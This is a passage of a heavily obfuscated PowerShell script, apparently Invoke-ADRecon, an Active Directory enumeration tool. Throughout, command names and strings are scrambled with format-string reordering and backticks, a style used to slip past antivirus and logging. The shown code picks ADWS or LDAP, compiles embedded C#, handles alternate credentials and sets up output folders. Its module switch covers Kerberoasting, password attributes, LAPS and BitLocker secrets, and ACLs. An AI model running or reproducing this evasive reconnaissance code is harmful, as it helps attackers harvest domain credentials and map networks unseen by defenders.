                &("{3}{2}{4}{0}{1}"-f 'odu','le','mport-','I','M') ("{2}{3}{1}{0}" -f 'ctory','Dire','Activ','e') -WarningAction ("{1}{0}" -f 'top','S') -ErrorAction ("{1}{0}" -f'op','St') | &("{1}{0}" -f 'ut-Null','O')
                If (${savE`Ve`Rbo`Se`pReFERence})
                {
                    ${sCripT:ve`RbosEp`ReFe`R`ENCE} = ${sAv`eV`er`Bos`epRefeRE`NCe}
                    &("{3}{1}{0}{2}"-f'e-Vari','emov','able','R') ("{1}{4}{5}{0}{2}{3}" -f 'seP','S','ref','erence','aveVerb','o')
                }
            }
            Catch
            {
                &("{0}{1}{2}{3}" -f'W','rite-','War','ning') (("{20}{0}{7}{4}{2}{18}{14}{6}{9}{12}{13}{3}{5}{11}{17}{8}{16}{19}{10}{15}{1}" -f'In',' with LDAP','r i','dul','ro','e fr','g A','voke-ADRecon] Er','rver Adminis','cti',' Tools) ... Conti','om RSAT','veDirec','tory Mo','tin','nuing','tra',' (Remote Se','mpor','tion','['))
                ${ME`TH`oD} = ("{0}{1}" -f'LDA','P')
                If (${SAVe`VErBosePrE`FE`R`en`cE})
                {
                    ${sCr`IPT`:`V`eRbo`sE`PREFERen`cE} = ${SaVEVE`RBOS`ePr`eFE`RenCE}
                    &("{0}{3}{2}{4}{1}"-f'R','ariable','mo','e','ve-V') ("{4}{6}{5}{3}{2}{0}{1}" -f 'n','ce','ePrefere','os','S','eVerb','av')
                }
                &("{2}{3}{1}{0}" -f 'e','e-Verbos','Wr','it') "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            &("{1}{3}{0}{2}" -f 'rn','Write-','ing','Wa') (("{15}{13}{1}{7}{9}{10}{14}{4}{8}{11}{6}{3}{5}{2}{12}{0}{19}{18}{17}{16}"-f 'lled ..','y ',') is',' To','er','ols','n','Mo','ve','d','ule','r Administratio',' not insta','e-ADRecon] ActiveDirector',' from RSAT (Remote S','[Invok',' LDAP',' with','ntinuing','. Co'))
            ${Me`TH`OD} = ("{0}{1}" -f'L','DAP')
        }
    }

    
    
    ${sAvEdEBuGpR`ef`ERe`N`Ce} = ${S`c`RIPT:`dEbU`GP`ReFER`e`NCE}
    ${s`cRIpt:deB`UG`PRE`FerenCE} = ("{1}{0}{2}" -f 'ntlyC','Sile','ontinue')
    Try
    {
        ${a`D`Vapi32} = &("{1}{0}"-f 'pe','Add-Ty') -MemberDefinition ${Advapi`3`2`dEf} -Name ("{0}{2}{1}" -f'Adv','i32','ap') -Namespace ("{0}{1}"-f'ADR','econ') -PassThru
        ${k`ernE`l32} = &("{1}{2}{0}"-f 'ype','A','dd-T') -MemberDefinition ${k`ernEl32`d`eF} -Name ("{1}{0}{2}" -f 'n','Ker','el32') -Namespace ("{2}{1}{0}"-f 'n','co','ADRe') -PassThru
        ${C`lr} = ( (gEt-Item ('VAri'+'Ab'+'Le:'+'b7IFn'+'j')).ValuE::("{2}{0}{4}{1}{3}"-f'ecu','As','GetEx','sembly','ting').Invoke()."iMA`geRUNT`IMEvER`SION")[1]
        If (${m`ETHoD} -eq ("{0}{1}" -f 'ADW','S'))
        {
            If (${Ps`VerSi`oN`TABLE}."psEDITi`On" -eq ("{0}{1}" -f'Cor','e'))
            {
                
                

                

                ${Ref`Fol`deR} = &("{2}{0}{1}" -f'oin-Pat','h','J') -Path (&("{1}{0}{3}{2}"-f 'P','Split-','h','at')( (Get-vaRiabLE ('R'+'wk')  -VaLUeoN)."asSeMB`ly"."lO`Ca`TiON")) -ChildPath "ref"
                &("{0}{1}" -f 'Ad','d-Type') -TypeDefinition $(${A`d`WSSo`UrCE} + ${pInGCa`s`TlEsmbSca`N`N`ers`OuRcE}) -ReferencedAssemblies ([System.String[]]@(
                    (&("{0}{1}" -f 'J','oin-Path') -Path ${Re`FfOl`dER} -ChildPath ("{5}{0}{2}{1}{4}{3}" -f'yst','Col','em.','ions.dll','lect','S'))
                    (&("{1}{2}{0}{3}" -f'P','Joi','n-','ath') -Path ${re`F`FOlder} -ChildPath ("{6}{5}{3}{9}{1}{0}{8}{7}{4}{2}{10}" -f'lect','l','eneric.d','.C','onG','m','Syste','N','ions.','o','ll'))
                    (&("{0}{1}{2}{3}"-f'Joi','n','-Pat','h') -Path ${Reff`O`lDeR} -ChildPath ("{4}{0}{3}{1}{2}"-f'hreadi','g','.dll','n','System.T'))
                    (&("{2}{0}{1}"-f 'oin-P','ath','J') -Path ${R`eFFOld`Er} -ChildPath ("{0}{4}{5}{2}{1}{3}" -f'System.Threadi','d','ad.','ll','n','g.Thre'))
                    (&("{3}{1}{0}{2}"-f 'Pat','oin-','h','J') -Path ${reF`Fol`DeR} -ChildPath ("{5}{3}{6}{4}{2}{1}{0}"-f 'rce.dll','Sou','ace','ys','Tr','S','tem.Diagnostics.'))
                    (  (  gEt-iTEm ("va"+"r"+"iA"+"bLE"+":b7ifnJ")).vALue::("{0}{4}{3}{5}{1}{2}" -f'LoadWithPa','am','e','al','rti','N').Invoke(("{1}{0}"-f'rlib','msco')))."l`OC`ATiOn"
                    ( (  GEt-VARiAbLe ('b'+'7IFnj') -valUeonLY)::("{0}{1}{3}{2}"-f'LoadW','ithPart','lName','ia').Invoke(("{1}{2}{0}"-f 'Linq','Sys','tem.')))."locATi`on"
                    ( (  VArIAbLe ("b"+"7I"+"FNj") -VA )::("{3}{2}{1}{0}" -f 'e','alNam','ithParti','LoadW').Invoke(("{1}{2}{4}{0}{3}" -f'X','Sys','tem.Priva','ml','te.')))."locat`I`oN"
                    ( (  get-itEM ('V'+'ARiABLE:B'+'7I'+'fNj')).vALuE::("{4}{2}{5}{1}{3}{0}" -f 'alName','hPar','adW','ti','Lo','it').Invoke(("{4}{1}{0}{5}{3}{2}" -f'c','ystem.Se','sControl','s','S','urity.Acce')))."l`oc`ATIoN"
                    (  $b7iFnj::("{1}{0}{3}{2}"-f 'dWithPar','Loa','alName','ti').Invoke(("{1}{4}{2}{3}{5}{0}"-f'ockets','Sy','em.Net','.','st','S')))."lO`caT`iOn"
                    ( $B7ifnJ::("{4}{1}{5}{0}{2}{3}" -f 'hP','adWi','artia','lName','Lo','t').Invoke(("{2}{0}{1}{4}{3}"-f'e','m.N','Syst','t.Primitives','e')))."LO`cat`IOn"
                    ( (VAriAbLe b7iFnj).VALUE::("{2}{3}{5}{0}{4}{1}" -f'th','lName','Loa','d','Partia','Wi').Invoke(("{8}{5}{2}{1}{0}{4}{7}{3}{6}" -f'pa','i','ty.Princ','do','l.W','i','ws','in','System.Secur')))."LOCa`TI`on"
                    ( (  Item  ("VARiab"+"le:b"+"7i"+"fNj")  ).ValUE::("{0}{3}{1}{2}"-f 'L','WithPartia','lName','oad').Invoke(("{3}{4}{6}{2}{1}{5}{0}"-f 'trol','.A','em','System','.IO.F','ccessCon','ileSyst')))."lo`cA`TION"
                    ( (  GEt-VArIaBLe  b7ifnJ  -vaLUE  )::("{0}{2}{1}{3}" -f 'Loa','m','dWithPartialNa','e').Invoke(("{2}{3}{1}{0}" -f'ole','s','Sys','tem.Con')))."Loc`ATIOn"
                    ( $B7IFNj::("{1}{2}{5}{4}{3}{0}" -f 'me','LoadWit','h','Na','artial','P').Invoke(("{5}{3}{4}{0}{2}{1}"-f 'ctory.','anagement','M','.A','ctiveDire','Microsoft')))."LO`cATi`On"
                    ( (gEt-VariABLE b7IFNJ  ).VaLUE::("{3}{4}{0}{2}{1}"-f 'W','tialName','ithPar','Lo','ad').Invoke(("{3}{2}{5}{0}{4}{1}"-f 'nt.Aut','mation','stem.Manage','Sy','o','me')))."lo`cAtI`on"
                    ( ( dIr VaRIablE:b7iFnJ ).vALue::("{0}{1}{2}{3}{4}" -f'LoadWi','t','hParti','a','lName').Invoke(("{4}{0}{3}{1}{2}"-f 'Dir','orySe','rvices','ect','System.')))."LoC`AtiON"
                ))
                &("{3}{2}{4}{0}{1}"-f'iabl','e','emo','R','ve-Var') ("{1}{2}{0}" -f 'der','r','efFol')
            }
            If (${c`Lr} -eq "4")
            {
                &("{1}{0}{2}" -f 'T','Add-','ype') -TypeDefinition $(${A`D`wssOu`Rce}+${pi`NGCAst`LeSMBScA`NnErsOur`CE}) -ReferencedAssemblies ([System.String[]]@(
                    (  ( vaRiABLE ("B7"+"IFnj")  ).VALuE::("{1}{0}{2}{3}"-f 'adWithParti','Lo','a','lName').Invoke(("{0}{4}{1}{2}{3}{7}{5}{6}" -f'Micros','.A','ctiv','eDire','oft','y','.Management','ctor')))."l`ocaT`iON"
                    (  $b7IFNJ::("{2}{3}{0}{1}{4}" -f'ial','Na','LoadWithPa','rt','me').Invoke(("{2}{5}{3}{0}{4}{6}{1}" -f 'r','vices','S','m.Di','ectoryS','yste','er')))."L`OcAt`iON"
                    (  (  VaRIaBLE ("b7i"+"fnJ")  -VALuE )::("{0}{2}{1}{3}"-f 'LoadWith','ia','Part','lName').Invoke(("{2}{0}{1}"-f 'ystem.XM','L','S')))."lO`cA`TiON"
                ))
            }
            Else
            {
                &("{0}{1}"-f'A','dd-Type') -TypeDefinition $(${AdW`S`SOUr`ce}+${p`I`N`gc`As`TLEsmbS`CaNnERsOURCe}) -ReferencedAssemblies ([System.String[]]@(
                    (  (  itEM  ("VArIAB"+"lE:B"+"7"+"IfN"+"j")).VAlUe::("{6}{5}{2}{1}{4}{3}{0}" -f 'me','t','dWi','artialNa','hP','oa','L').Invoke(("{7}{0}{1}{6}{2}{4}{3}{5}"-f'roso','ft.Activ','re','tory.Manag','c','ement','eDi','Mic')))."LOCa`T`iON"
                    (  $B7IfnJ::("{0}{1}{4}{3}{2}"-f'L','o','me','PartialNa','adWith').Invoke(("{3}{4}{2}{1}{0}" -f 'es','ryServic','irecto','Sy','stem.D')))."LOca`TioN"
                    ( (  VaRIAblE  ('B'+'7IF'+'Nj')  -VA )::("{0}{1}{3}{2}"-f 'Lo','adWithPart','Name','ial').Invoke(("{0}{2}{1}"-f'S','ML','ystem.X')))."Lo`CA`TIOn"
                )) -Language ("{2}{0}{3}{1}{4}"-f 'Sh','rp','C','a','Version3')
            }
        }

        If (${M`e`ThOd} -eq ("{0}{1}" -f 'LD','AP'))
        {
            If (${psvERs`I`ontab`le}."pS`eD`i`TIoN" -eq ("{0}{1}"-f'C','ore'))
            {
                
                

                

                ${r`efFO`LDEr} = &("{2}{0}{1}"-f 'Pa','th','Join-') -Path (&("{2}{0}{1}" -f't-','Path','Spli')(  (  VariabLE  ('Rw'+'K')  -vaLUEonly )."a`SsemB`LY"."LOcaT`I`oN")) -ChildPath "ref"
                &("{1}{0}"-f'dd-Type','A') -TypeDefinition $(${LDa`p`soURcE} + ${piNgCAS`T`l`ES`mBsc`ANnersOurcE}) -ReferencedAssemblies ([System.String[]]@(
                    (&("{0}{1}"-f'Join-Pa','th') -Path ${REFFOl`D`er} -ChildPath ("{1}{3}{2}{0}{4}" -f'lecti','Syste','l','m.Co','ons.dll'))
                    (&("{0}{2}{1}"-f'Join-','ath','P') -Path ${R`EFfO`lDer} -ChildPath ("{7}{1}{0}{6}{5}{4}{3}{2}"-f 'e','t','ll','d','ric.','ns.NonGene','m.Collectio','Sys'))
                    (&("{0}{2}{1}" -f'J','n-Path','oi') -Path ${ReF`FO`Lder} -ChildPath ("{6}{5}{1}{4}{3}{0}{2}"-f 'g.d','r','ll','n','eadi','ystem.Th','S'))
                    (&("{2}{1}{0}" -f 'th','in-Pa','Jo') -Path ${refFo`l`dEr} -ChildPath ("{5}{2}{3}{6}{4}{1}{0}"-f'dll','ad.','hr','ea','ing.Thre','System.T','d'))
                    (&("{1}{2}{0}"-f 'h','Jo','in-Pat') -Path ${rEFfol`d`eR} -ChildPath ("{5}{4}{1}{3}{2}{0}{6}"-f'ce.dl','iagnostics','TraceSour','.','em.D','Syst','l'))
                    (  ( get-vARiabLE  B7IFNJ -Valu )::("{3}{0}{5}{4}{2}{6}{1}" -f 'dWithP','e','Na','Loa','rtial','a','m').Invoke(("{1}{2}{3}{0}"-f'q','Syst','em.L','in')))."Loc`AtI`ON"
                    ( (GeT-chilDITem  VARIABLE:B7iFNj  ).VAlUe::("{4}{2}{1}{0}{3}" -f 'am','tialN','dWithPar','e','Loa').Invoke(("{2}{1}{3}{0}{4}"-f'Priva','em','Syst','.','te.Xml')))."Loca`TIoN"
                    ( ( GEt-VaRIable B7IFNj).valUE::("{1}{0}{3}{2}"-f 'l','LoadWithPartia','ame','N').Invoke(("{3}{5}{2}{1}{6}{0}{4}"-f'cces','curi','.Se','Sy','sControl','stem','ty.A')))."L`OCATiON"
                    ( $b7IFnj::("{2}{3}{0}{4}{5}{1}" -f 'rt','lName','LoadWi','thPa','i','a').Invoke(("{1}{0}{3}{2}" -f'et.Sock','System.N','s','et')))."l`OcATiON"
                    ( ( DiR VarIaBLe:B7iFNj  ).VALUe::("{5}{4}{1}{0}{3}{2}" -f 'rtia','Pa','me','lNa','oadWith','L').Invoke(("{0}{1}{5}{4}{2}{3}" -f 'System.Ne','t.P','i','ves','it','rim')))."L`ocAT`iON"
                    (  $b7Ifnj::("{4}{0}{2}{1}{3}"-f'oadWithPa','a','rtialN','me','L').Invoke(("{4}{1}{0}{6}{2}{5}{7}{3}"-f 'i','ity.Pr','al.','s','System.Secur','Wind','ncip','ow')))."L`OCa`TIon"
                    ( ( GEt-chILditEM ("Va"+"riaB"+"le:b"+"7"+"iFNj")  ).VaLuE::("{0}{5}{1}{2}{6}{3}{4}" -f'Lo','h','Par','ialNa','me','adWit','t').Invoke(("{2}{4}{0}{6}{3}{1}{5}"-f 'IO.Fil','.AccessCont','Sys','System','tem.','rol','e')))."l`ocAt`ion"
                    ( $b7IFNJ::("{1}{3}{0}{4}{2}" -f'hParti','L','Name','oadWit','al').Invoke(("{3}{0}{4}{5}{7}{2}{1}{6}" -f 'ste','lut','NameReso','Sy','m.','N','ion','et.')))."lO`cAti`on"
                    ( (  get-iTeM VaRiAble:B7iFNJ).vaLUe::("{0}{4}{2}{3}{1}" -f 'LoadWit','e','Partia','lNam','h').Invoke(("{4}{3}{2}{1}{0}" -f'le','onso','em.C','t','Sys')))."LO`caT`ION"
                    (  ( vaRIable  b7IfNJ).VALUE::("{3}{4}{1}{2}{0}"-f 'me','ithPar','tialNa','Load','W').Invoke(("{4}{6}{2}{1}{5}{0}{7}{3}" -f'.Autom','Manag','m.','tion','S','ement','yste','a')))."LOca`Ti`on"
                    ( (  DiR  ('vaRIab'+'lE:'+'B7I'+'fNj')).vALue::("{2}{1}{0}{3}" -f 'Partia','dWith','Loa','lName').Invoke(("{2}{1}{4}{0}{3}"-f 'toryServ','i','System.D','ices','rec')))."loC`At`iOn"
                ))
                &("{0}{2}{1}"-f'Re','iable','move-Var') ("{1}{0}{2}" -f 'Fo','ref','lder')
            }
            Else
            {
                If (${C`lr} -eq "4")
                {
                    &("{1}{0}" -f 'ype','Add-T') -TypeDefinition $(${ldApSOu`R`Ce}+${p`inGcA`StleSMB`S`C`A`NneRS`ouRce}) -ReferencedAssemblies ([System.String[]]@(
                        (  $B7IFNj::("{0}{1}{3}{2}" -f'Load','Wi','ialName','thPart').Invoke(("{4}{2}{6}{5}{1}{0}{3}" -f'ce','i','stem.Direct','s','Sy','yServ','or')))."locAT`i`oN"
                        (  $b7IFNJ::("{3}{1}{2}{0}" -f'PartialName','adWit','h','Lo').Invoke(("{1}{2}{0}" -f '.XML','Syste','m')))."locA`TION"
                    ))
                }
                Else
                {
                    &("{0}{1}" -f'Add-Ty','pe') -TypeDefinition $(${l`da`P`SoURCe}+${P`INgCaST`leSMBsCANN`ERSOU`RCe}) -ReferencedAssemblies ([System.String[]]@(
                        ( (  diR  VarIable:B7IfNj ).VaLuE::("{0}{3}{2}{1}"-f 'LoadWit','e','lNam','hPartia').Invoke(("{1}{4}{2}{0}{3}" -f 'm.D','S','te','irectoryServices','ys')))."LoC`AT`ioN"
                        ( (  geT-variabLE  ('B7iFn'+'j')).ValUE::("{1}{2}{3}{0}{4}"-f'Part','L','oa','dWith','ialName').Invoke(("{0}{2}{1}" -f'S','L','ystem.XM')))."LOCA`T`ioN"
                    )) -Language ("{2}{4}{0}{1}{3}"-f 'rsi','o','CSharpV','n3','e')
                }
            }
        }
    }
    Catch
    {
        &("{0}{1}{2}{3}"-f'Wr','ite-Ou','tp','ut') "[Invoke-ADRecon] $($_.Exception.Message) "
        Return ${nu`lL}
    }
    If (${sA`V`eDEB`Ug`PReFeRence})
    {
        ${S`CRipT:`D`EBu`gP`REfErEncE} = ${s`Ave`DEbugPRe`Fe`RenCe}
        &("{2}{0}{1}"-f'e-','Variable','Remov') ("{4}{0}{3}{2}{1}"-f'aveDeb','ence','gPrefer','u','S')
    }

    
    
    If ((${mETh`Od} -eq ("{1}{0}" -f'AP','LD')) -and (${uS`e`Al`TcREdS}) -and (${DOm`Ai`Nc`on`T`ROlLeR} -eq "") -and (${CrE`d`EnT`IaL} -eq  (GEt-VAriabLE ("cLF0"+"N")  ).valuE::"EM`pty"))
    {
        Try
        {
            ${O`BjDOMA`iN} = [ADSI]""
            If(!(${o`B`Jd`omAIN}."NA`me"))
            {
                &("{2}{3}{1}{0}" -f 'se','o','Write-Ve','rb') ("{12}{5}{14}{1}{8}{2}{10}{11}{6}{3}{7}{4}{9}{13}{0}" -f 'essful','AD',' ',' LDA','d Un','v','NAS Check,','P bin','Recon]','suc','R','U','[In','c','oke-')
            }
            ${USE`AltC`REdS} = ${fa`lSE}
            ${obJ`doMA`iN}.("{0}{1}"-f'Dispo','se').Invoke()
        }
        Catch
        {
            ${usealtc`R`eds} = ${T`RUE}
        }
    }

    If (${U`seAltc`Re`Ds} -and ((${d`Omai`N`cOn`TR`oLlEr} -eq "") -or (${cREDe`N`Tial} -eq  ( VarIable  CLf0N ).VaLUe::"em`Pty")))
    {

        If ((${DOmA`iNc`ontr`oLLeR} -ne "") -and (${c`R`eDENTIaL} -eq   ( GeT-vArIaBlE Clf0N ).vALUe::"emP`TY"))
        {
            Try
            {
                ${cr`E`DenT`iAL} = &("{0}{2}{3}{1}"-f'Get-Crede','l','nti','a')
            }
            Catch
            {
                &("{3}{2}{1}{0}"-f'utput','te-O','ri','W') "[Invoke-ADRecon] $($_.Exception.Message) "
                Return ${N`Ull}
            }
        }
        Else
        {
            &("{0}{2}{1}" -f'Write-Out','ut','p') ((("{0}{5}{12}{10}{2}{6}{1}{7}{11}{9}{3}{8}{4}{13}" -f 'R','1 -','ADRecon.p','additional info','a','un Get-He','s','Examples fo','rm',' ','p .jVx','r','l','tion.'))."ReP`L`AcE"(([chAR]106+[chAR]86+[chAR]120),[stRiNg][chAR]92))
            &("{2}{3}{1}{0}"-f 'put','t','Writ','e-Ou') ("{12}{13}{0}{11}{5}{1}{8}{6}{2}{4}{10}{7}{9}{3}{14}" -f'n','mai','troll','mete','er ','he -Do','on','d -Creden','nC','tial para','an','] Use t','[Invoke-A','DReco','r.')('
')
            Return ${nu`Ll}
        }
    }

    If (${C`REden`TiaL} -ne   $ClF0N::"emP`Ty")
    {
        ${uSE`RNAme} = $(${crEd`E`N`TIaL}."USe`R`NamE")
    }
    Else
    {
        ${US`eR`NamE} = $( (  gCI vaRiablE:ABoZ ).vALUe::"Use`RN`Ame")
    }

    &("{3}{0}{1}{2}"-f '-','Outpu','t','Write') ('[*'+'] '+'Runni'+'n'+'g '+'on'+' '+"$RanonComputer "+'as'+' '+"$Username")

    &("{2}{3}{4}{1}{0}" -f 'ble','aria','Re','mov','e-V') ("{1}{0}{2}" -f'rnam','Use','e')

    Switch (${cO`LLe`ct})
    {
        ("{1}{0}" -f 't','Fores') { ${AD`RFore`st} = ${TR`Ue} }
        ("{1}{0}" -f 'omain','D') {${aDR`d`OMaiN} = ${t`Rue} }
        ("{0}{1}" -f 'Tru','sts') { ${aDr`TR`Ust} = ${t`Rue} }
        ("{1}{0}" -f'es','Sit') { ${ad`RsI`Te} = ${tr`UE} }
        ("{0}{2}{1}" -f'Sub','s','net') { ${a`dRSu`BNEt} = ${tR`UE} }
        ("{2}{3}{0}{1}"-f'maHi','story','Sc','he') { ${adRs`c`He`m`AhIS`TOry} = ${tR`UE} }
        ("{0}{1}{3}{2}"-f'PasswordP','o','icy','l') { ${A`DRPaSS`wo`RdpO`lICy} = ${t`RUE} }
        ("{3}{1}{0}{6}{5}{2}{4}"-f'GrainedPassw','e','d','Fin','Policy','r','o') { ${Ad`RfI`NEGrA`ineD`PaSS`woRDpOlI`cy} = ${t`RuE} }
        ("{4}{1}{2}{0}{3}" -f'oller','inCon','tr','s','Doma') { ${ad`RDOmA`i`NCO`NTr`oLl`Ers} = ${t`Rue} }
        ("{0}{1}" -f 'U','sers') { ${adr`USE`RS} = ${Tr`UE} }
        ("{1}{2}{0}" -f'Ns','User','SP') { ${A`DRUSERS`PnS} = ${Tr`UE} }
        ("{2}{0}{1}{3}" -f 'a','sswordAttrib','P','utes') { ${a`DrP`ASSWo`R`d`ATtRiB`UTes} = ${TR`Ue} }
        ("{1}{0}" -f'roups','G') {${a`d`RGroups} = ${T`RUE} }
        ("{0}{1}{2}{3}"-f 'Grou','pCh','ange','s') { ${A`d`RGrOuPcHAn`geS} = ${TR`UE} }
        ("{1}{2}{0}"-f 'embers','Group','M') { ${adrgrO`UpMe`MB`ers} = ${tR`Ue} }
        'OUs' { ${adR`OUS} = ${tR`UE} }
        ("{0}{1}" -f 'G','POs') { ${a`drGpOS} = ${t`RUE} }
        ("{0}{2}{1}"-f'gPL','ks','in') { ${A`d`RGPl`inKs} = ${T`RuE} }
        ("{1}{0}"-f'NSZones','D') { ${aD`RDnS`ZOnes} = ${TR`UE} }
        ("{2}{0}{1}{3}"-f'NSR','ecor','D','ds') { ${ad`RD`NSRe`C`orDS} = ${Tr`Ue} }
        ("{1}{2}{0}" -f 'rs','Print','e') { ${aD`RP`Ri`NterS} = ${t`RuE} }
        ("{0}{1}" -f 'Com','puters') { ${aDRCo`mPut`e`RS} = ${tr`Ue} }
        ("{3}{1}{0}{2}"-f'u','p','terSPNs','Com') { ${ADRco`MpuT`ErSp`Ns} = ${t`RuE} }
        ("{1}{0}"-f'PS','LA') { ${adRLa`Ps} = ${t`Rue} }
        ("{1}{2}{3}{0}"-f'ker','Bi','t','Loc') { ${a`DRbIt`LOCK`Er} = ${TR`Ue} }
        ("{1}{0}"-f 's','ACL') { ${A`D`RAcLs} = ${TR`Ue} }
        ("{0}{1}{2}" -f'G','PORep','ort')
        {
            ${ad`RG`p`or`epORt} = ${tr`Ue}
            ${aDRc`Rea`Te} = ${T`Rue}
        }
        ("{1}{2}{0}" -f'st','Kerbe','roa') { ${aDr`K`eRbe`Roast} = ${Tr`Ue} }
        ("{5}{3}{7}{4}{1}{6}{8}{2}{0}{9}"-f'ceLog','ntsu','rServi','inA','cou','Doma','sedf','c','o','on') { ${Ad`Rd`OMAina`CCoUn`TsU`s`Ed`FORSeRV`Icelog`ON} = ${Tr`Ue} }
        ("{1}{0}{2}" -f'fau','De','lt')
        {
            ${ADR`F`Orest} = ${TR`UE}
            ${ADr`dO`MaiN} = ${tr`UE}
            ${AD`RtrU`st} = ${tR`UE}
            ${AD`RSITe} = ${Tr`UE}
            ${A`dr`sU`BNet} = ${TR`UE}
            ${ad`R`Sc`h`eMAhISToRy} = ${t`RUE}
            ${AD`R`PAsSWorDp`OLICy} = ${tR`Ue}
            ${AdR`F`INeGr`AInE`DpA`SsWorDpolicY} = ${tR`UE}
            ${aDr`DOMAI`NCOnTr`oLlers} = ${t`RuE}
            ${aD`Ru`S`erS} = ${T`Rue}
            ${aDRuSEr`S`p`NS} = ${TR`Ue}
            ${a`D`RPASs`WOrdattR`ibu`T`ES} = ${TR`Ue}
            ${aD`RgRO`U`pS} = ${tr`UE}
            ${a`DR`gRouPmE`MB`eRs} = ${t`Rue}
            ${ad`Rg`ROuPChA`NgeS} = ${t`RUe}
            ${ADR`o`US} = ${tR`UE}
            ${A`Dr`GPOS} = ${tR`Ue}
            ${aD`RGp`LI`NKs} = ${TR`Ue}
            ${adrdn`s`z`ONeS} = ${t`RuE}
            ${aD`Rdn`srEco`R`DS} = ${tr`UE}
            ${aDRp`RiN`TERS} = ${t`RuE}
            ${A`DRcOMP`UtERS} = ${tR`UE}
            ${a`DrCom`PU`TerSp`Ns} = ${T`RUe}
            ${aDR`laPs} = ${t`RUe}
            ${A`DRB`ITLO`ckER} = ${tR`UE}
            
            ${adrG`pO`Rep`OrT} = ${TR`UE}
            
            

            If (${O`Ut`Put`TyPE} -eq ("{0}{1}" -f 'D','efault'))
            {
                [array] ${o`UT`puT`TYPe} = "CSV",("{0}{1}" -f'Exce','l')
            }
        }
    }

    Switch (${Ou`T`Putt`ypE})
    {
        ("{1}{0}{2}"-f'TDOU','S','T') { ${adR`ST`DoUt} = ${Tr`UE} }
        'CSV'
        {
            ${a`dRCsv} = ${tR`UE}
            ${aDr`c`Reate} = ${t`Rue}
        }
        'XML'
        {
            ${adR`x`ML} = ${t`RUE}
            ${A`d`RcrEatE} = ${t`RUE}
        }
        ("{1}{0}" -f 'SON','J')
        {
            ${a`dRjS`on} = ${T`Rue}
            ${adrc`R`EATe} = ${TR`UE}
        }
        ("{0}{1}"-f'HTM','L')
        {
            ${ADR`HT`mL} = ${Tr`Ue}
            ${Adrc`Re`AtE} = ${t`RuE}
        }
        ("{0}{1}"-f 'E','xcel')
        {
            ${AdR`eXCEl} = ${Tr`UE}
            ${ADrcr`eA`TE} = ${T`RUE}
        }
        'All'
        {
            
            ${a`D`Rcsv} = ${t`RUe}
            ${Ad`RXml} = ${Tr`UE}
            ${Ad`RjsoN} = ${tR`UE}
            ${aD`RHT`ML} = ${tr`UE}
            ${A`Dr`exceL} = ${T`RUE}
            ${A`d`RCrEatE} = ${t`RUe}
            [array] ${OU`TPuTty`pE} = "CSV","XML",("{0}{1}"-f'JSO','N'),("{0}{1}" -f'H','TML'),("{1}{0}" -f'el','Exc')
        }
        ("{0}{1}"-f'Defau','lt')
        {
            [array] ${OuTPU`T`T`ype} = {"{1}{0}"-f 'DOUT','ST'}
            ${adRS`Tdo`Ut} = ${T`RUE}
        }
    }

    If ( (${adRE`x`cel}) -and (-Not ${aDR`C`Sv}) )
    {
        ${a`drC`Sv} = ${t`RUE}
        [array] ${o`U`TPUT`TyPe} += "CSV"
    }

    ${R`etUrND`Ir} = &("{0}{2}{3}{1}"-f'Ge','tion','t-Lo','ca')
    ${d`AtE} = &("{1}{2}{0}" -f 'te','Ge','t-Da')

    
    If ( (${AdRoU`Tp`UT`diR}) -and (${a`dR`creATE}) )
    {
        If (!(&("{1}{0}" -f 'Path','Test-') ${aD`ROuT`PutdiR}))
        {
            &("{0}{1}{2}"-f'Ne','w-It','em') ${a`droU`TPu`TDIR} -type ("{2}{0}{1}"-f'c','tory','dire') | &("{0}{1}"-f 'Out-','Null')
            If (!(&("{1}{2}{0}" -f'-Path','Te','st') ${Adro`Utp`U`TD`iR}))
            {
                &("{1}{0}{2}" -f '-Outpu','Write','t') ("{6}{0}{12}{1}{13}{4}{2}{7}{8}{5}{9}{3}{10}{11}"-f'Reco',' ','invalid Output',' ... ','r, ','a','[Invoke-AD','D','ir P','th','Ex','iting','n]','Erro')
                Return ${N`Ull}
            }
        }
        ${aDrOU`T`p`U`TDir} = $((&("{1}{0}{2}"-f'vert-P','Con','ath') ${a`d`ROutPU`TDIR}).("{0}{2}{1}"-f 'Tr','End','im').Invoke("\"))
        &("{0}{2}{1}{3}"-f'W','Ve','rite-','rbose') ('[*]'+' '+'Output'+' '+'Di'+'rect'+'ory: '+"$ADROutputDir")
    }
    ElseIf (${adrc`RE`ATE})
    {
        ${Adr`out`puTDir} =  -join(${RE`TU`RndIR},'\',("{1}{3}{4}{2}{0}"-f't-','ADRe','or','con-Re','p'),$(&("{1}{0}{2}" -f't','Ge','-Date') -UFormat ("{0}{1}{2}" -f '%','Y%m%d%H%M','%S')))
        &("{1}{0}"-f 'w-Item','Ne') ${A`Dr`OuTpU`TdiR} -type ("{0}{1}"-f 'di','rectory') | &("{1}{0}" -f 'Null','Out-')
        If (!(&("{1}{0}{2}"-f'at','Test-P','h') ${A`Drou`TpU`Tdir}))
        {
            &("{2}{0}{1}"-f'te-Outp','ut','Wri') ("{7}{2}{8}{6}{3}{9}{0}{4}{10}{1}{5}"-f ', ','output direc','ADRecon','ro','co','tory',' Er','[Invoke-',']','r','uld not create ')
            Return ${nu`Ll}
        }
        ${aDRouTP`UTd`Ir} = $((&("{2}{0}{3}{1}"-f 'onvert-P','h','C','at') ${Ad`ROU`TpUTd`IR}).("{1}{0}" -f'nd','TrimE').Invoke("\"))
        &("{2}{1}{0}{3}"-f 'Variab','-','Remove','le') ("{0}{2}{1}"-f 'AD','ate','RCre')
    }
    Else
    {
        ${aD`Rou`TPut`dIr} = ${r`Etur`NdIR}
    }

    If (${adrc`SV})
    {
        ${CSV`Pa`Th} = [System.IO.DirectoryInfo] -join(${aD`ROuTp`UTdIr},'\',("{2}{0}{1}" -f'SV-Fi','les','C'))
        &("{1}{2}{0}"-f'Item','New','-') ${cS`V`PATh} -type ("{0}{1}{2}" -f'di','recto','ry') | &("{0}{1}"-f 'Out-','Null')
        If (!(&("{0}{2}{1}"-f 'Te','th','st-Pa') ${Csv`pa`Th}))
        {
            &("{3}{2}{1}{0}"-f 'ut','tp','rite-Ou','W') ("{9}{1}{14}{13}{0}{10}{2}{8}{11}{6}{12}{7}{5}{3}{4}"-f'on] Er','Invoke-ADR','oul','ec','tory','ut dir','at','p','d not c','[','ror, c','re','e out','c','e')
            Return ${n`UlL}
        }
        &("{3}{0}{2}{1}"-f'riab','e','l','Remove-Va') ("{1}{0}{2}"-f'DRC','A','SV')
    }

    If (${AdR`x`Ml})
    {
